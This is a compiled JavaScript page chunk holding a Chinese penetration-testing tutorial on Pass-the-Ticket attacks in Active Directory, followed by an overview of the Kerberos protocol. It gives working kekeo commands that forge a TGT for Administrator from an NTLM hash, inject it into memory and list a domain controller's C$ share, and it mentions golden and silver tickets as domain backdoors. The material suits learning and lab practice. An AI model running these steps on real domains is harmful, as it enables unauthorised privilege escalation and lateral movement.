(window.webpackJsonp=window.webpackJsonp||[]).push([[50],{775:function(s,e,t){"use strict";t.r(e);var a=t(103),r=Object(a.a)({},(function(){var s=this,e=s.$createElement,t=s._self._c||e;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h2",{attrs:{id:"票据传递攻击"}},[s._v("票据传递攻击 "),t("a",{staticClass:"header-anchor",attrs:{href:"#票据传递攻击"}},[s._v("#")])]),s._v(" "),t("blockquote",[t("p",[s._v("票据传递（Pass the Ticket，PtT），使用 Kerberos票据，不需要管理员权限，攻击有效期是在票据有效期之内(一般为7天)。")]),s._v(" "),t("p",[s._v("在微软活动目录中颁发的TGT是可移植的，由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。")]),s._v(" "),t("p",[s._v("这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。")]),s._v(" "),t("p",[s._v("新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。")])]),s._v(" "),t("p",[s._v("工具kekeo：https://github.com/gentilkiwi/kekeo/releases")]),s._v(" "),t("p",[s._v("（1）在当前目录生成一个高权限票据文件")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("kekeo.exe "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"tgt::ask /user:Administrator /domain:wintrysec.lab /ntlm:f3a0acba8bcfb8a0896281bbfcb793ed"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("（2）使用系统自带命令，清除内存中的票据")]),s._v(" "),t("div",{staticClass:"language-baash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("klist purge\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("（3）将票据文件导入内存")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("kekeo "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"kerberos::ptt TGT_administrator@WINTRYSEC.LAB_krbtgt~wintrysec.lab@WINTRYSEC.LAB.kirbi"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("（4）列出远程主机的文件")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DC"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("c$\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("code",[s._v("比较典型的金票和银票留域后门就是票据传递攻击")])]),s._v(" "),t("h2",{attrs:{id:"kerberos认证协议"}},[s._v("Kerberos认证协议 "),t("a",{staticClass:"header-anchor",attrs:{href:"#kerberos认证协议"}},[s._v("#")])]),s._v(" "),t("p",[s._v("Kerberos是一种基于票据的集中式的认证方式，认证过程涉及到三方：Client、Server、KDC。")]),s._v(" "),t("p",[s._v("在Windows域环境中，KDC的角色常常由DC（域控制器）来担任。")]),s._v(" "),t("p",[s._v("票据（Ticket）用来安全的在认证服务器和用户请求的服务之间传递用户的身份。")]),s._v(" "),t("blockquote",[t("p",[t("strong",[s._v("KDC")]),s._v("（Key Distribution Center）：密钥分发中心，kerberos认证服务器，由AS和TGS组成，在认证中会访问 AD数据库；")]),s._v(" "),t("p",[t("strong",[s._v("AS")]),s._v("（Authentication Server）：身份认证服务")]),s._v(" "),t("p",[t("strong",[s._v("TGS")]),s._v("（Ticket Granting Server）：票据授予服务，该服务提供的票据为（"),t("strong",[s._v("白银票据")]),s._v("）")]),s._v(" "),t("p",[t("strong",[s._v("TGT")]),s._v("（Ticket Granting Ticket）：身份认证服务授予的票据（"),t("strong",[s._v("黄金票据")]),s._v("），用于身份认证，存储在内存，默认有效期为10小时")])]),s._v(" "),t("p",[s._v("在域环境中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。")]),s._v(" "),t("hr"),s._v(" "),t("p",[s._v("关于内网协议的深入研究可以参考 daiker 师傅的总结（Kerberos、NTML、LDAP）")]),s._v(" "),t("p",[s._v("地址：https://daiker.gitbook.io/windows-protocol/")])])}),[],!1,null,null,null);e.default=r.exports}}]);